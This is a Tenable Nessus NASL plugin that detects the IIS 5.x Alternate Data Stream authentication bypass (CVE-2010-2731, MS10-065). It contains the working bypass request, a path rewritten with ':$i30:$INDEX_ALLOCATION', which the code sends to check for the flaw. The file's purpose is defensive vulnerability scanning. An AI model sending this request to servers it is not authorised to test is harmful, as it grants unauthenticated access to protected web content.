#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(47594);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/10/27 15:03:53 $");

  script_cve_id("CVE-2010-2731");
  script_bugtraq_id(41314);
  script_osvdb_id(66160);
  script_xref(name:"IAVA", value:"2010-A-0120");
  script_xref(name:"MSFT", value:"MS10-065");
  script_xref(name:"Secunia", value:"40412");

  script_name(english:"IIS 5.x Alternate Data Stream Authentication Bypass");
  script_summary(english:"Attempts to access a protected directory.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an authentication bypass
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of IIS 5.x installed on the remote host is affected by an
authentication bypass vulnerability.  It is possible to access
protected web directories without authentication through use of an
Alternate Data Stream to open protected folders.

A remote, unauthenticated attacker can leverage this issue to gain
access to protected web directories.");

  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5260c233");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Jul/12");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/MS10-065");
  script_set_attribute(attribute:"solution", value:"Microsoft has released a set of patches for IIS 5.1.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if (!banner) exit(1, "Unable to get the banner from the web server on port "+port+".");
if ("Server: Microsoft-IIS/5" >!< banner) exit(0, "The web server on port "+port+" does not appear to be IIS 5.x");


# We need a protected page for our test.
pages = pages = get_kb_list("www/"+port+"/content/auth_required");
if (isnull(pages)) exit(0, "No protected pages were detected on the web server on port "+port+".");
pages = make_list(pages);

# Try to get a protected subdirectory.  This doesn't appear
# to work against the root directory
page = NULL;
for (i=0; i<max_index(pages); i++)
{
  if (pages[i] =~ '^/[^/]+/.*')
  {
    page = pages[i];
    break;
  }
}
if (isnull(page)) exit(0, "No protected subdirectories were detected on the web server on port "+port+".");
if (ereg(pattern:'/$', string:page)) page += 'default.asp';


# Try a bogus attack.
url = ereg_replace(pattern:"^(/.*)(/[^/]+)$", replace:"\1:$i42:$NESSUS_CHECK\2", string:page);
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (res[0] !~ " (200|404)") exit(1, "The web server on port "+port+" didn't respond with a 202/404 response code to a bogus query.");


# And now the real attack.
url = ereg_replace(pattern:"^(/.*)(/[^/]+)$", replace:"\1:$i30:$INDEX_ALLOCATION\2", string:page);
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  res[0] =~ '^HTTP/1\\.1 200' ||
  (report_paranoia > 1 && res[0] =~ '^HTTP/1\\.1 404')
)
{
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to reproduce the issue using the following URL : \n' +
      build_url(port:port, qs:url) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
exit(0, "The IIS server on port " + port + " is not affected.");
